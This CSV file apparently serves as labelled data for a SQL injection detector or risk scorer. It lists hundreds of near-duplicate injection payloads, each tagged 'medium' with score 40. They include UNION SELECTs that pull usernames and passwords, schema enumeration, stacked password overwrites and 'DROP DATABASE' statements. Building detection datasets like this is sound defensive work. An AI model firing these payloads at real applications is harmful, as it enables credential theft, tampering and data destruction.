query,risk,score
' OR username LIKE '%admin%' -- /**/ -- b,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 # ,medium,40
' OR username LIKE '%admin%' -- /**/ # 8e,medium,40
' or 1=1 in (select * from users) -- # 4pxiw9p,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- /**/ /**/",medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1 -- ,medium,40
"' UNION SELECT username, password FROM users -- -- xrtbz9",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1 -- ",medium,40
' HAVING 1=1 # -- oeeu54,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1 -- ",medium,40
1' OR 1=1; SELECT * FROM users -- -- k8dun7,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1 -- ",medium,40
' OR username LIKE '%admin%' -- OR 1=1 # ,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 3tmvyk",medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 # ,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1 -- ,medium,40
' HAVING 1=1 # AND 1=1 -- ,medium,40
' HAVING 1=1 # # i5mcj55,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1 -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 # ",medium,40
' or 1=1 in (select * from users) -- # iip5ppy,medium,40
'; UPDATE users SET password='pass' -- 4cwmrs,medium,40
'; SELECT COUNT(*) FROM users -- /**/ /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # pt0tkv2",medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- tthykp,medium,40
'; DROP DATABASE temp -- OR 1=1 # ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- nalqil,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1 -- ",medium,40
'; SELECT @@version -- AND 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1 -- ,medium,40
' or 1=1 in (select * from users) -- OR 1=1 # ,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 # ,medium,40
' OR username LIKE '%admin%' -- -- n91cse,medium,40
' HAVING 1=1 # /**/ # tq,medium,40
'; SELECT COUNT(*) FROM users -- /**/ -- e,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1 -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 116q3dg",medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 # ,medium,40
'; UPDATE users SET password='pass' -- aeom5o,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ -- p",medium,40
' or 1 = 1 LIMIT 1 -- # 1xqh328,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ux9d0t,medium,40
"' UNION SELECT username, password FROM users -- /**/ /**/",medium,40
' or 1=1 in (select * from users) -- AND 1=1 -- ,medium,40
'; SELECT @@version -- OR 1=1 # ,medium,40
'; SELECT @@version -- /**/ # yv,medium,40
'; SELECT @@version -- /**/ /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # vg",medium,40
'; DROP DATABASE temp -- AND 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- r6svc8,medium,40
' or 1=1 in (select * from users) -- # 2f7qgxx,medium,40
'; SELECT @@version -- -- oa6ciq,medium,40
'; DROP DATABASE temp -- OR 1=1 # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1 -- ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1 -- ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 # ",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1 -- ,medium,40
'; DROP DATABASE temp -- AND 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ # o6",medium,40
'; SELECT @@version -- -- 3wldh6,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 # ,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # gu,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 # ",medium,40
' or 1 = 1 LIMIT 1 -- # jockgqw,medium,40
' HAVING 1=1 # OR 1=1 # ,medium,40
' or 1=1 in (select * from users) -- AND 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ol33e9,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1 -- ",medium,40
'; DROP DATABASE temp -- OR 1=1 # ,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1 -- ",medium,40
"' UNION SELECT username, password FROM users -- -- 6vo3pe",medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # 6l,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 # ",medium,40
'; DROP DATABASE temp -- -- p0w456,medium,40
1' OR 1=1; SELECT * FROM users -- # a8ejt9l,medium,40
1' OR '1' = '1' GROUP BY 1 -- # fwvq2o5,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1 -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1 -- ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # b9",medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 # ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # r05qy18",medium,40
'; UPDATE users SET password='pass' AND 1=1 -- ,medium,40
' HAVING 1=1 # AND 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1 -- ,medium,40
'; SELECT @@version -- AND 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 # ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1 -- ",medium,40
' OR username LIKE '%admin%' -- -- 9om7fz,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # cl0mjbt",medium,40
' or 1 = 1 LIMIT 1 -- -- 8wcagp,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 # ,medium,40
'; SELECT @@version -- AND 1=1 -- ,medium,40
'; UPDATE users SET password='pass' LIMIT 1 -- ,medium,40
'; DROP DATABASE temp -- AND 1=1 -- ,medium,40
'; SELECT @@version -- LIMIT 1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- i2h0ku,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ebozkh",medium,40
' HAVING 1=1 # OR 1=1 # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- gh3656,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # ze",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- l3orka",medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 # ,medium,40
"' UNION SELECT username, password FROM users -- /**/ /**/",medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1 -- ",medium,40
'; UPDATE users SET password='pass' # dqwblr5,medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 # ",medium,40
' or 1 = 1 LIMIT 1 -- # be1b57y,medium,40
'; DROP DATABASE temp -- /**/ /**/,medium,40
'; SELECT @@version -- -- ivez7q,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 # ,medium,40
' or 1 = 1 LIMIT 1 -- # 3oxi669,medium,40
'; DROP DATABASE temp -- /**/ -- y,medium,40
'; DROP DATABASE temp -- # 2qxcouh,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 # ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ /**/",medium,40
1' OR 1=1; SELECT * FROM users -- /**/ # zh,medium,40
'; SELECT @@version -- AND 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- # gqwsk5k,medium,40
'; SELECT @@version -- AND 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 2q2dui2",medium,40
'; SELECT COUNT(*) FROM users -- -- smdneu,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1 -- ,medium,40
' or 1=1 in (select * from users) -- LIMIT 1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1 -- ",medium,40
' or 1 = 1 LIMIT 1 -- -- ha8jja,medium,40
' or 1=1 in (select * from users) -- # 0yp7rra,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 # ,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- fq99fb,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1 -- ",medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 # ,medium,40
'; SELECT @@version -- # x3pgeca,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 # ",medium,40
' OR username LIKE '%admin%' -- -- z6l4w9,medium,40
' or 1=1 in (select * from users) -- # u49nk17,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # bg83mqr",medium,40
"' UNION SELECT username, password FROM users -- # 1675cwk",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 9ufm17",medium,40
' OR username LIKE '%admin%' -- # z632er9,medium,40
1' OR '1' = '1' GROUP BY 1 -- # qe7kvzb,medium,40
'; DROP DATABASE temp -- # 19nwwum,medium,40
' or 1=1 in (select * from users) -- -- b9t4sh,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 # ,medium,40
1' OR 1=1; SELECT * FROM users -- # oi4pbsr,medium,40
' or 1=1 in (select * from users) -- -- sji1cd,medium,40
' or 1=1 in (select * from users) -- -- x67417,medium,40
' HAVING 1=1 # AND 1=1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ # cd",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- gktpz2,medium,40
' HAVING 1=1 # # efuf4b5,medium,40
'; UPDATE users SET password='pass' LIMIT 1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 # ,medium,40
"' UNION SELECT username, password FROM users -- # z59zf0y",medium,40
' or 1=1 in (select * from users) -- OR 1=1 # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # ns",medium,40
' HAVING 1=1 # /**/ # f5,medium,40
' HAVING 1=1 # /**/ -- 1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1 -- ",medium,40
' HAVING 1=1 # AND 1=1 -- ,medium,40
'; DROP DATABASE temp -- # rna1wo1,medium,40
'; SELECT COUNT(*) FROM users -- -- aafml7,medium,40
' or 1=1 in (select * from users) -- # 8tkn5ir,medium,40
'; UPDATE users SET password='pass' LIMIT 1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1 -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1 -- ",medium,40
"' UNION SELECT username, password FROM users -- AND 1=1 -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # s9,medium,40
' HAVING 1=1 # LIMIT 1 -- ,medium,40
'; SELECT @@version -- -- b4gdnp,medium,40
"' UNION SELECT username, password FROM users -- # 1ecae39",medium,40
' HAVING 1=1 # /**/ /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ -- 5",medium,40
'; SELECT @@version -- # fwrbp2j,medium,40
' or 1=1 in (select * from users) -- -- rxpi0z,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1 -- ,medium,40
' HAVING 1=1 # LIMIT 1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1 -- ",medium,40
' or 1=1 in (select * from users) -- LIMIT 1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 # ",medium,40
' or 1=1 in (select * from users) -- OR 1=1 # ,medium,40
' or 1=1 in (select * from users) -- AND 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1 -- ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 551xs4",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # 57",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # uzmedpy",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- z9fpmv",medium,40
' or 1=1 in (select * from users) -- LIMIT 1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # t2mtdae,medium,40
'; SELECT COUNT(*) FROM users -- # vy081hl,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1 -- ",medium,40
' or 1=1 in (select * from users) -- -- 40qhlu,medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 # ,medium,40
' HAVING 1=1 # /**/ /**/,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 # ,medium,40
'; UPDATE users SET password='pass' # bogku32,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1 -- ",medium,40
' OR username LIKE '%admin%' -- LIMIT 1 -- ,medium,40
"' UNION SELECT username, password FROM users -- # j7hhg7r",medium,40
'; SELECT @@version -- -- vhsx15,medium,40
'; UPDATE users SET password='pass' LIMIT 1 -- ,medium,40
' OR username LIKE '%admin%' -- AND 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 # ,medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 86kxb4",medium,40
' or 1 = 1 LIMIT 1 -- -- xm2p8h,medium,40
' or 1 = 1 LIMIT 1 -- /**/ /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # hxoc1vy",medium,40
'; SELECT @@version -- LIMIT 1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1 -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- # vh6jd5i,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1 -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # 5o,medium,40
'; DROP DATABASE temp -- AND 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1 -- ,medium,40
'; DROP DATABASE temp -- OR 1=1 # ,medium,40
' OR username LIKE '%admin%' -- AND 1=1 -- ,medium,40
' OR username LIKE '%admin%' -- AND 1=1 -- ,medium,40
'; UPDATE users SET password='pass' /**/ # gg,medium,40
1' OR 1=1; SELECT * FROM users -- -- caxfoy,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 # ",medium,40
'; UPDATE users SET password='pass' # 4no7xx2,medium,40
'; DROP DATABASE temp -- /**/ -- f,medium,40
'; SELECT @@version -- -- v2k2ep,medium,40
' UNION SELECT * FROM information_schema.tables -- -- p64og9,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 # ,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1 -- ",medium,40
' OR username LIKE '%admin%' -- -- m0wk4f,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # oq",medium,40
' or 1 = 1 LIMIT 1 -- # 33nkxow,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # 6l",medium,40
' or 1 = 1 LIMIT 1 -- -- 0vlvu6,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1 -- ,medium,40
'; SELECT @@version -- OR 1=1 # ,medium,40
'; UPDATE users SET password='pass' # cqmylqf,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1 -- ,medium,40
' or 1=1 in (select * from users) -- /**/ -- 4,medium,40
'; SELECT @@version -- OR 1=1 # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1 -- ,medium,40
' HAVING 1=1 # AND 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1 -- ,medium,40
' or 1=1 in (select * from users) -- /**/ -- 9,medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1 -- ",medium,40
1' OR 1=1; SELECT * FROM users -- -- enqzg0,medium,40
1' OR 1=1; SELECT * FROM users -- -- gdocod,medium,40
'; UPDATE users SET password='pass' OR 1=1 # ,medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1 -- ,medium,40
'; UPDATE users SET password='pass' AND 1=1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- pdtp0v,medium,40
'; SELECT COUNT(*) FROM users -- -- u1izec,medium,40
1' OR 1=1; SELECT * FROM users -- /**/ /**/,medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1 -- ,medium,40
'; SELECT @@version -- LIMIT 1 -- ,medium,40
' HAVING 1=1 # # cyjvbuh,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ -- 2",medium,40
1' OR 1=1; SELECT * FROM users -- # pa8bdur,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1 -- ,medium,40
' or 1=1 in (select * from users) -- # x49xnag,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1 -- ",medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 # ",medium,40
"' UNION SELECT username, password FROM users -- # rpr9sdx",medium,40
'; SELECT COUNT(*) FROM users -- # iob8ma5,medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1 -- ,medium,40
'; DROP DATABASE temp -- /**/ -- w,medium,40
' HAVING 1=1 # LIMIT 1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ -- j",medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 # ,medium,40
'; SELECT @@version -- AND 1=1 -- ,medium,40
'; DROP DATABASE temp -- LIMIT 1 -- ,medium,40
'; DROP DATABASE temp -- /**/ /**/,medium,40
"' UNION SELECT username, password FROM users -- # q55r8dr",medium,40
' OR username LIKE '%admin%' -- -- h8htgi,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 8d4xyg",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1 -- ",medium,40
'; DROP DATABASE temp -- -- skzjtx,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # onpp0kq",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ /**/",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- r6oxmx",medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1 -- ,medium,40
' OR username LIKE '%admin%' -- /**/ -- o,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1 -- ",medium,40
'; UPDATE users SET password='pass' OR 1=1 # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # a9",medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1 -- ,medium,40
'; SELECT @@version -- # 8ymlpv4,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1 -- ,medium,40
'; UPDATE users SET password='pass' OR 1=1 # ,medium,40
' UNION SELECT * FROM information_schema.tables -- # 96h5pe2,medium,40
"' UNION SELECT username, password FROM users -- # ijh55zz",medium,40
' OR username LIKE '%admin%' -- -- 5pa9jq,medium,40
'; SELECT @@version -- OR 1=1 # ,medium,40
' or 1=1 in (select * from users) -- -- 1kklzc,medium,40
' or 1=1 in (select * from users) -- # 9w85poc,medium,40
' UNION SELECT * FROM information_schema.tables -- # nkg29w5,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 # ,medium,40
' HAVING 1=1 # /**/ -- i,medium,40
' or 1=1 in (select * from users) -- # ugtesnk,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 # ,medium,40
' OR username LIKE '%admin%' -- /**/ /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1 -- ",medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1 -- ,medium,40
'; SELECT @@version -- /**/ # as,medium,40
'; DROP DATABASE temp -- -- 0qf3lk,medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # odri0br",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # zwknzo5",medium,40
'; SELECT @@version -- OR 1=1 # ,medium,40
"' UNION SELECT username, password FROM users -- /**/ -- 2",medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 # ,medium,40
' OR username LIKE '%admin%' -- AND 1=1 -- ,medium,40
'; SELECT @@version -- -- ro1w1m,medium,40
' HAVING 1=1 # AND 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 # ",medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 # ",medium,40
'; DROP DATABASE temp -- LIMIT 1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- # t03o8kp,medium,40
' or 1=1 in (select * from users) -- -- 4d8wtx,medium,40
'; SELECT COUNT(*) FROM users -- # 0e8p0ay,medium,40
'; UPDATE users SET password='pass' /**/ -- h,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ -- u",medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 # ,medium,40
' HAVING 1=1 # # nxj1mbg,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1 -- ,medium,40
' OR username LIKE '%admin%' -- OR 1=1 # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 # ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1 -- ",medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1 -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1 -- ",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1 -- ,medium,40
'; SELECT @@version -- LIMIT 1 -- ,medium,40
'; DROP DATABASE temp -- /**/ # bt,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 1vbk6o3",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # o3qmtj3",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # 97,medium,40
'; DROP DATABASE temp -- /**/ /**/,medium,40
1' OR 1=1; SELECT * FROM users -- -- cw8r9z,medium,40
'; DROP DATABASE temp -- # mork07l,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # o3,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 # ",medium,40
'; DROP DATABASE temp -- OR 1=1 # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 # ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/ -- 3",medium,40
'; SELECT @@version -- OR 1=1 # ,medium,40
' OR username LIKE '%admin%' -- AND 1=1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1 -- ,medium,40
' or 1=1 in (select * from users) -- AND 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1 -- ,medium,40
"' UNION SELECT username, password FROM users -- # vq03a4z",medium,40
' HAVING 1=1 # /**/ /**/,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1 -- ",medium,40
' or 1 = 1 LIMIT 1 -- # 81ku233,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ # fd",medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1 -- ,medium,40
'; UPDATE users SET password='pass' /**/ -- 5,medium,40
' HAVING 1=1 # LIMIT 1 -- ,medium,40
' OR username LIKE '%admin%' -- AND 1=1 -- ,medium,40
'; UPDATE users SET password='pass' LIMIT 1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ -- 5,medium,40
' HAVING 1=1 # AND 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # lto0o8f,medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- AND 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- OR 1=1 # ,medium,40
' or 1 = 1 LIMIT 1 -- -- 6vd7yu,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1 -- ",medium,40
'; DROP DATABASE temp -- LIMIT 1 -- ,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 # ",medium,40
' OR username LIKE '%admin%' -- AND 1=1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1 -- ",medium,40
"' UNION SELECT username, password FROM users -- AND 1=1 -- ",medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1 -- ,medium,40
' OR username LIKE '%admin%' -- /**/ -- h,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 # ,medium,40
'; UPDATE users SET password='pass' /**/ # aw,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1 -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1 -- ,medium,40
' OR username LIKE '%admin%' -- OR 1=1 # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 863n2l",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 96j8ovg",medium,40
